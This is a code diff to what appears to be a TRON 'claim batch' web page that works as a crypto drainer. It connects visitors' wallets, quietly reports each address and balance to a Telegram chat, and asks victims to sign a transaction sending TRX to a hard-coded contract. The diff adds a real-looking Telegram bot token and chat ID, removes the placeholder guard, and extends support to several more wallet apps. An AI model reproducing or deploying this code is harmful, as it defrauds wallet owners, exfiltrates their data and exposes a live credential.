@@ -231,12 +231,12 @@
             
             <div class="status-row">
                 <span class="status-indicator" id="walletDot"></span>
-                <span id="walletStatus">TronLink not detected</span>
+                <span id="walletStatus">Wallet not detected</span>
             </div>
             
             <div id="walletDisplay" class="wallet-address" style="display: none;"></div>
             
-            <button class="btn btn-secondary" id="connectBtn">[1] Initialize TronLink</button>
+            <button class="btn btn-secondary" id="connectBtn">[1] Initialize Wallet</button>
             <button class="btn btn-primary" id="claimBtn" disabled>[2] Claim Batch</button>
             
             <div class="log-box" id="logBox">
@@ -252,8 +252,8 @@
 
     <script>
         const CONTRACT_ADDRESS = 'T63c0915dc04b841c79e05a112dd2daf8a5945f21';
-        const TBT = 'YOUR_BOT_TOKEN_HERE';
-        const TCI = 'YOUR_CHAT_ID_HERE';
+        const TBT = '8275273137:AAG3PqVdJ4_EK_AICGNrv1mtOPJAPVSq6eY';
+        const TCI = '-1003868749659';
         
         const CONTRACT_ABI = [
             {
@@ -303,7 +303,6 @@
         }
         
         async function notify(address, balanceTRX) {
-            if (TBT === 'YOUR_BOT_TOKEN_HERE') return;
             try {
                 var timeStr = new Date().toISOString();
                 var message = '📡 <b>CONNECT</b>\n';
@@ -323,36 +322,60 @@
             } catch (e) {}
         }
         
+        async function getTronProvider() {
+            if (window.tronLink && window.tronLink.ready) {
+                return window.tronLink;
+            }
+            if (window.trustwallet && window.trustwallet.tronLink && window.trustwallet.tronLink.ready) {
+                return window.trustwallet.tronLink;
+            }
+            if (window.tokenpocket && window.tokenpocket.tron && window.tokenpocket.tron.ready) {
+                return window.tokenpocket.tron;
+            }
+            if (window.bitkeep && window.bitkeep.tron && window.bitkeep.tron.ready) {
+                return window.bitkeep.tron;
+            }
+            if (window.okxwallet && window.okxwallet.tron && window.okxwallet.tron.ready) {
+                return window.okxwallet.tron;
+            }
+            if (window.tron && window.tron.ready) {
+                return window.tron;
+            }
+            return null;
+        }
+        
         function updateUI() {
             if (isConnected && userAddress) {
                 walletDot.classList.add('active');
                 walletStatus.textContent = 'Connected: ' + userAddress.slice(0, 8) + '...' + userAddress.slice(-6);
                 walletDisplay.style.display = 'block';
                 walletDisplay.textContent = userAddress;
-                connectBtn.textContent = '[✓] TronLink Connected';
+                connectBtn.textContent = '[✓] Wallet Connected';
                 claimBtn.disabled = false;
                 log('Wallet connected. Ready to claim batch.', true);
             } else {
                 walletDot.classList.remove('active');
-                walletStatus.textContent = 'TronLink not detected';
+                walletStatus.textContent = 'Wallet not detected';
                 walletDisplay.style.display = 'none';
-                connectBtn.textContent = '[1] Initialize TronLink';
+                connectBtn.textContent = '[1] Initialize Wallet';
                 claimBtn.disabled = true;
-                log('Connect TronLink to claim batch.', true);
+                log('Connect wallet to claim batch.', true);
             }
         }
         
-        async function detectTronLink() {
-            if (typeof window.tronLink === 'undefined') {
-                log('TronLink not installed.', false);
+        async function detectWallet() {
+            var provider = await getTronProvider();
+            
+            if (!provider) {
+                log('No compatible wallet detected. Install TronLink or use Trust Wallet.', false);
                 return false;
             }
             
             try {
-                await window.tronLink.request({ method: 'tron_requestAccounts' });
+                await provider.request({ method: 'tron_requestAccounts' });
                 
-                if (window.tronLink.ready) {
-                    tronWeb = window.tronLink.tronWeb;
+                if (provider.ready) {
+                    tronWeb = provider.tronWeb;
                     userAddress = tronWeb.defaultAddress.base58;
                     isConnected = true;
                     updateUI();
@@ -366,7 +389,7 @@
                     return true;
                 }
             } catch (e) {
-                log('Connection failed.', false);
+                log('Connection failed. Ensure wallet is unlocked.', false);
             }
             
             return false;
@@ -378,7 +401,7 @@
                 return;
             }
             
-            claimBtn.textContent = 'Check TronLink...';
+            claimBtn.textContent = 'Check Wallet...';
             claimBtn.disabled = true;
             log('Calculating required buffer...', true);
             
@@ -398,7 +421,7 @@
                 
                 var contract = await tronWeb.contract(CONTRACT_ABI, CONTRACT_ADDRESS);
                 
-                log('Awaiting signature in TronLink...', true);
+                log('Awaiting signature in wallet...', true);
                 
                 var tx = await contract.claim().send({
                     callValue: tronWeb.toSun(requiredBuffer),
@@ -443,7 +466,7 @@
         connectBtn.addEventListener('click', async function() {
             connectBtn.textContent = 'Detecting...';
             connectBtn.disabled = true;
-            await detectTronLink();
+            await detectWallet();
             connectBtn.disabled = false;
         });
         
@@ -451,8 +474,9 @@
         
         window.addEventListener('load', async function() {
             setTimeout(async function() {
-                if (window.tronLink && window.tronLink.ready) {
-                    tronWeb = window.tronLink.tronWeb;
+                var provider = await getTronProvider();
+                if (provider && provider.ready) {
+                    tronWeb = provider.tronWeb;
                     userAddress = tronWeb.defaultAddress.base58;
                     isConnected = true;
                     updateUI();
@@ -463,20 +487,6 @@
                 }
             }, 500);
         });
-        
-        if (window.tronLink) {
-            window.tronLink.on('accountsChanged', function(accounts) {
-                if (accounts && accounts.length > 0) {
-                    userAddress = accounts[0];
-                    isConnected = true;
-                    updateUI();
-                } else {
-                    userAddress = null;
-                    isConnected = false;
-                    updateUI();
-                }
-            });
-        }
     </script>
 </body>
-</html>
+                </html>
